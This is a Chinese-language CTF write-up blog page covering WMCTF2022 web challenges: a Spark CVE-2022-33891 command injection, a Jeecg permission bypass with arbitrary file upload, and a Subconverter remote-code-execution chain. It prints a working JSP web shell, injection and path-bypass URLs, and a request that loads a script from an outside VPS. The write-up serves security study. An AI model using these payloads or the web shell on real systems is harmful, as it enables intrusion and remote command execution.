@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>WMCTF2022 Web WriteUP - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="WMCTF2022 Web WriteUP - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/07/08/WMCTF2022%20Web%20WriteUP/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-07-08T03:36:04.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>July</span>
+            <span>8,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">WMCTF2022 Web WriteUP</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><p>没环境。没办法，只能做一些知识点的学习了。<br>入口是个任意文件读取，读取War，然后再度K8s的token，就可以查看K8s的服务有个spark，版本是3.2.1，考虑CVE-2022-33891，因此这里主要是对这个漏洞做个复现</p>
+<h2 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h2><p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/spark/spark-3.2.1/">https://archive.apache.org/dist/spark/spark-3.2.1/</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688564741010-442ff533-27a4-47ee-b4ab-32cd38e6d70d.png#averageHue=%23f9f9f9&clientId=ua3870871-2f1e-4&from=paste&height=25&id=u76fa9eeb&originHeight=31&originWidth=583&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1160&status=done&style=none&taskId=ucba604ac-c7cf-4fe2-b14c-fa26cfbc63e&title=&width=466.4" alt="image.png"><br>安装完后，改一下bin目录下的spark-shell脚本，加一个调试选项<br><code>export SPARK_SUBMIT_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688564794808-9260de10-932f-4545-81d2-cd22904f6250.png#averageHue=%23faf9f8&clientId=ua3870871-2f1e-4&from=paste&height=490&id=u442bc803&originHeight=612&originWidth=1539&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46630&status=done&style=none&taskId=u5bc2af0c-71c5-40c8-a3d1-117ba686fe0&title=&width=1231.2" alt="image.png"><br>幸亏我是子系统。然后遇到了个BUG，JDK版本是17太高了，害。果然之前没有搞的都得还。然后捏windows访问不到wsl的ip。我放到VPS上去了。<br><code>./spark-shell --conf spark.acls.enable=true</code><br><code>[http://xxxx/jobs/?doAs=;touch%20/tmp/pwned](http://114.116.119.253:4041/jobs/?doAs=;touch%20/tmp/pwned)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688619885836-c8721575-d7f0-453b-ad2e-0a8b68948317.png#averageHue=%23e9e9e8&clientId=u49b34421-8597-4&from=paste&height=286&id=u931899c3&originHeight=358&originWidth=1468&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45696&status=done&style=none&taskId=u9dc10b6b-03c3-4b7e-88ef-db88d8eead9&title=&width=1174.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688619923591-6c51ee35-b5cb-475c-8ac8-64fda906bf80.png#averageHue=%232a2c2a&clientId=u49b34421-8597-4&from=paste&height=582&id=u673a427f&originHeight=728&originWidth=1907&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1883657&status=done&style=none&taskId=u73f935bc-978c-4ca5-ba9f-ef87969af7a&title=&width=1525.6" alt="image.png"><br>代码是scala写的，勉强也看得懂，先进入doFilter函数，然后接收doAs参数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688619948744-eaaa6e11-be86-476d-97fe-82ab4396c1d6.png#averageHue=%2331322e&clientId=u49b34421-8597-4&from=paste&height=82&id=u05187d4e&originHeight=103&originWidth=991&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=158823&status=done&style=none&taskId=ua7960dbb-fcce-4552-875a-e2150070fb5&title=&width=792.8" alt="image.png"><br>随后进入checkUIViewPermissions函数<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688619968270-76d04177-c281-432c-9bce-428af1ef9b4a.png#averageHue=%2330302a&clientId=u49b34421-8597-4&from=paste&height=160&id=u91f9a6fc&originHeight=200&originWidth=1166&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=332341&status=done&style=none&taskId=u08de6e24-7bac-49c6-8a92-6742cf6aa68&title=&width=932.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688619983326-41842389-f5f9-4870-a109-2e4baef79f87.png#averageHue=%232e2f2a&clientId=u49b34421-8597-4&from=paste&height=232&id=u744473d0&originHeight=290&originWidth=1188&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=501627&status=done&style=none&taskId=u2bf7f852-88c5-4bc0-a65c-ca5d8cdfcd1&title=&width=950.4" alt="image.png"><br>进入isUserInACL，这是我们为什么启动时开启ACL配置。并且看变量框可以发现，user是恶意cmd<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620017470-55683873-8597-474d-8da0-4cf2ca6f1033.png#averageHue=%23292a29&clientId=u49b34421-8597-4&from=paste&height=182&id=u9a3930fb&originHeight=228&originWidth=1014&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=319861&status=done&style=none&taskId=ub6642a54-a5d2-4447-b73f-d7fac292840&title=&width=811.2" alt="image.png"><br>继续跟进user参数，进入getCurrentUserGroups里面<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620049002-678440cd-822a-491f-862d-5c9227f1cf5b.png#averageHue=%232b2c2a&clientId=u49b34421-8597-4&from=paste&height=669&id=u7569cb75&originHeight=836&originWidth=1469&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1696171&status=done&style=none&taskId=uf4fc0119-1811-4daf-a476-fa7acd81521&title=&width=1175.2" alt="image.png"><br>然后getGroup<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620073444-c29f73e5-00c0-4d99-8a5b-5176009ba3f3.png#averageHue=%232a2c2a&clientId=u49b34421-8597-4&from=paste&height=562&id=ue0272071&originHeight=702&originWidth=1506&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1476555&status=done&style=none&taskId=uff09e24f-c0c9-4a55-a921-00957ce1321&title=&width=1204.8" alt="image.png"><br>接下来直接进行了cmd的拼贴。所以造成了命令注入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620097456-1a9bab21-659b-4644-9fbb-2dcf6dfb88f9.png#averageHue=%23292b28&clientId=u49b34421-8597-4&from=paste&height=504&id=u3c59cbaa&originHeight=630&originWidth=1461&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1260284&status=done&style=none&taskId=u48a4b5d1-cfab-4214-ad94-e84d1360da6&title=&width=1168.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620118104-c808bf46-e189-4996-86a9-18349e84c65d.png#averageHue=%2330302b&clientId=u49b34421-8597-4&from=paste&height=313&id=u56d7f51b&originHeight=391&originWidth=1084&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=615971&status=done&style=none&taskId=u315b4633-8e4d-4a4e-b02b-8051f999b11&title=&width=867.2" alt="image.png"><br>最后创建文件成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620146882-0cf1184b-216c-4bb5-bad9-785afd9bb360.png#averageHue=%23262321&clientId=u49b34421-8597-4&from=paste&height=68&id=u9ad4299c&originHeight=85&originWidth=703&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=10481&status=done&style=none&taskId=ufd5ec28f-dbf6-4820-b434-87c7eedf11c&title=&width=562.4" alt="image.png"><br>我们也可以改为反弹shell。</p>
+<h1 id="Jeecg"><a href="#Jeecg" class="headerlink" title="Jeecg"></a>Jeecg</h1><p>考点：Java代码审计，任意文件上传，权限绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620476742-15ad3786-8c53-4ed5-bdf9-7b544bf87923.png#averageHue=%23d4dbe0&clientId=u49b34421-8597-4&from=paste&height=600&id=u73626bc5&originHeight=750&originWidth=1535&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=330542&status=done&style=none&taskId=u7a790a85-45a6-4211-a3e5-82eb55eb407&title=&width=1228" alt="image.png"><br>长这b样。然后审计代码可以发现一些问题<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688620961941-7b553d78-95cd-4b50-89e1-932873240395.png#averageHue=%232a2c2a&clientId=uf689e221-32bf-4&from=paste&height=824&id=ub64c069f&originHeight=1030&originWidth=1847&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2645205&status=done&style=none&taskId=uee68cd55-3a7e-44a3-bbcd-24915fc8b29&title=&width=1477.6" alt="image.png"><br>cgUpload控制器的ajaxSave函数并没有判断白名单。所以假如可以调用到该路由就可以进行任意文件上传，但是有一个Auth监听器鉴权。我们需要做的就是绕过权限限制。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688621328292-b7130e81-53f8-47cd-9cc9-0fbd7e3c473c.png#averageHue=%23252724&clientId=uf689e221-32bf-4&from=paste&height=634&id=u74e46e5e&originHeight=793&originWidth=1350&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1467286&status=done&style=none&taskId=u0314b896-f083-41b0-97f5-fe343637311&title=&width=1080" alt="image.png"><br>这里使用的是getRequestURI进行判断。所以可以使用<code>;``..;/</code>这样的东西进行绕过，有关参考<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1659416">https://cloud.tencent.com/developer/article/1659416</a><br>我们这里就直接复现一下。首先准备个JSP马</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;name&quot;</span>)).getInputStream()));</span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        b.append(line + <span class="string">&quot; &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    out.println(b.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>然后用burp抓个包。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688621502593-db1b1788-ac67-4902-9404-112c6f493197.png#averageHue=%232e2e2e&clientId=uf689e221-32bf-4&from=paste&height=621&id=ucd6f439d&originHeight=776&originWidth=1367&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110342&status=done&style=none&taskId=uef74ad23-0587-406f-92ea-b518ff2965e&title=&width=1093.6" alt="image.png"><br>正常send过去是会被auth拦截器拦截的。但是我们看看配置文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688621521499-8c05ba40-b09f-4975-8f70-e283205b2e76.png#averageHue=%232f2e29&clientId=uf689e221-32bf-4&from=paste&height=194&id=u579d0066&originHeight=243&originWidth=895&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=317966&status=done&style=none&taskId=uf144f6f8-89d3-47a6-98dc-05c040a32d0&title=&width=716" alt="image.png"><br>放了个白名单，那就有机可乘了。我们可以用<code>cgUploadController.do;toLogin.do/?ajaxSaveFile</code>上传文件，原理就是<code>;toLogin/</code>会被截断去除，但是这样又绕过了auth认证，怎么绕过auth认证的呢？请看我分析<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658116048-54d8c962-3fa8-468c-8e00-b55bcf7f5f10.png#averageHue=%232b2d29&clientId=uafa48e42-f00f-4&from=paste&height=461&id=ua3eb4d5c&originHeight=576&originWidth=1515&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1260835&status=done&style=none&taskId=uc132b4eb-7e0d-40d8-bcdb-1e7d8053a1b&title=&width=1212" alt="image.png">调用了<code>getJgAuthRequsetPath</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658191610-644af696-6e39-43b5-adaa-8f8e6b9c0256.png#averageHue=%232b2b27&clientId=uafa48e42-f00f-4&from=paste&height=430&id=u74ba411a&originHeight=537&originWidth=1226&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=944338&status=done&style=none&taskId=u5cf65182-d4a2-46de-b6c3-9b82dfc4f8d&title=&width=980.8" alt="image.png"><br>这里用的是getrequestURI，获取路径<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658216432-88b475eb-9e2d-413d-b727-6b704b4451f3.png#averageHue=%23292b29&clientId=uafa48e42-f00f-4&from=paste&height=471&id=ueec773c3&originHeight=589&originWidth=1508&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1256590&status=done&style=none&taskId=u0f871151-93e9-48c7-89ce-88f8d3af316&title=&width=1206.4" alt="image.png"><br>在上面判断一些东西，也没识别到，就原本原样返回。然后回到preHandle<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658254439-2ef59ccb-a403-496c-b64a-cc4ffab90de2.png#averageHue=%232c2e2c&clientId=uafa48e42-f00f-4&from=paste&height=753&id=u7dc0da09&originHeight=941&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1954903&status=done&style=none&taskId=ubebdf031-4807-4044-8a79-904698bcde8&title=&width=1164.8" alt="image.png"><br>因为前三个if都没识别到，所以进入了mohu模糊判断，只要路径包含白名单的url就绕过了。很傻逼这个判断，然后又因为tomcat处理请求的特性，会把<code>;和/</code>之间的内容删掉，所以造成了绕过拉<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658303751-5e3b7648-ad4c-448d-ab9b-466e46bf094e.png#averageHue=%2330302f&clientId=uafa48e42-f00f-4&from=paste&height=640&id=u4659b13c&originHeight=800&originWidth=1357&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=184695&status=done&style=none&taskId=ucbf1e196-ea31-4f9c-bdf4-486f88dd459&title=&width=1085.6" alt="image.png"><br>我们改成一个马上传，然后哥斯拉访问。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658427793-9291d029-061c-4e65-99b1-68d23c748a08.png#averageHue=%2330302f&clientId=uafa48e42-f00f-4&from=paste&height=515&id=u375dc307&originHeight=644&originWidth=1445&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=144386&status=done&style=none&taskId=u66338811-b1b4-4a5a-9e69-c1948cc602d&title=&width=1156" alt="image.png"><br>去访问这个马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658482347-09790258-afb9-4682-9c40-e3b8f8c32874.png#averageHue=%23fdfdfd&clientId=uafa48e42-f00f-4&from=paste&height=448&id=u5a978eed&originHeight=560&originWidth=1616&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28380&status=done&style=none&taskId=ubd5c6d35-ccd2-4116-9277-8f53a59cce1&title=&width=1292.8" alt="image.png"><br>会给nginx拦了。但是我们也可以用<code>/a/..;/</code>绕过<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688658588897-8bee472a-dc96-4795-a288-1faf0977bffc.png#averageHue=%23d3d3d3&clientId=uafa48e42-f00f-4&from=paste&height=624&id=u6d8e4379&originHeight=780&originWidth=1508&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47998&status=done&style=none&taskId=u3d65ee41-b655-4000-850a-736eb74ea3b&title=&width=1206.4" alt="image.png"><br>结束咯</p>
+<h1 id="Subconvertor"><a href="#Subconvertor" class="headerlink" title="Subconvertor"></a>Subconvertor</h1><p>考点：subconvertor一个rce漏洞<br>这东西本来是用来做格式转换的，结果被WM的114挖了洞（114我的偶像）<br><a target="_blank" rel="noopener" href="https://gist.github.com/CwithW/01a726e5af709655d6ee0b2067cdae03">https://gist.github.com/CwithW/01a726e5af709655d6ee0b2067cdae03</a><br>参考这个POC<br>然后这一题是CVE的升级版，加了个token认证，我们可以通过任意文件读取读取token，继续rce<br>读源码发现几个路由</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/version</span><br><span class="line">/refreshrules</span><br><span class="line">/readconf</span><br><span class="line">/updateconf</span><br><span class="line">/flushcache</span><br><span class="line">/sub</span><br><span class="line">/sub2clashr</span><br><span class="line">/surge2clash</span><br><span class="line">/getruleset</span><br><span class="line">/getprofile</span><br><span class="line">/qx-script</span><br><span class="line">/qx-rewrite</span><br><span class="line">/render</span><br><span class="line">/convert</span><br></pre></td></tr></table></figure>
+<p>首先<code>/qx-script?url=cHJlZi50b21s</code>读取配置文件获取token<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688660672540-a3e2ea0d-4c5e-4641-a4d9-e150afdd5aae.png#averageHue=%23f4f4f3&clientId=uafa48e42-f00f-4&from=paste&height=197&id=u1d4c20bd&originHeight=246&originWidth=841&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=11859&status=done&style=none&taskId=uc94010a8-1981-4a32-87aa-78a1f2c5954&title=&width=672.8" alt="image.png"><br>然后我们</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/sub?target=clash&amp;url=http:<span class="comment">//vps/1.js</span></span><br><span class="line">/sub?target=clash&amp;url=script:cache/63ff1abb5db4fd2df0498c46a44565c8,<span class="number">1</span>&amp;token=xxx</span><br><span class="line">/qx-script?url=ZmxhYWFhYWFn</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688661080996-c4b55187-ee83-4723-900a-36c8933931e3.png#averageHue=%23d4b787&clientId=uafa48e42-f00f-4&from=paste&height=185&id=u68ace659&originHeight=231&originWidth=1041&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16719&status=done&style=none&taskId=u0b3c99e1-60c7-49ee-ac43-22d7e2a46fc&title=&width=832.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688661153021-8d22bfe9-2e0f-44eb-8e9d-980eb62bf2d4.png#averageHue=%23c0a882&clientId=uafa48e42-f00f-4&from=paste&height=182&id=u20cc9679&originHeight=228&originWidth=1489&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18749&status=done&style=none&taskId=ub27f10df-fe31-41d3-a855-7e15e208a97&title=&width=1191.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1688661186040-7da3366f-b648-4ae5-876f-0082fb976461.png#averageHue=%23bfb09e&clientId=uafa48e42-f00f-4&from=paste&height=181&id=ud472916a&originHeight=226&originWidth=873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8563&status=done&style=none&taskId=u9909f19b-7b3c-41f6-966f-c90fa8fc29b&title=&width=698.4" alt="image.png"><br>就行了，只不过flag是空的。</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/07/08/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8A%E5%85%B6%E4%B8%80%E7%B3%BB%E5%88%97%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Phar反序列化及其一系列的奇技淫巧</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/07/08/BUUCTF%20Web%20WriteUp%208/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">BUUCTF Web Writeup 8</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
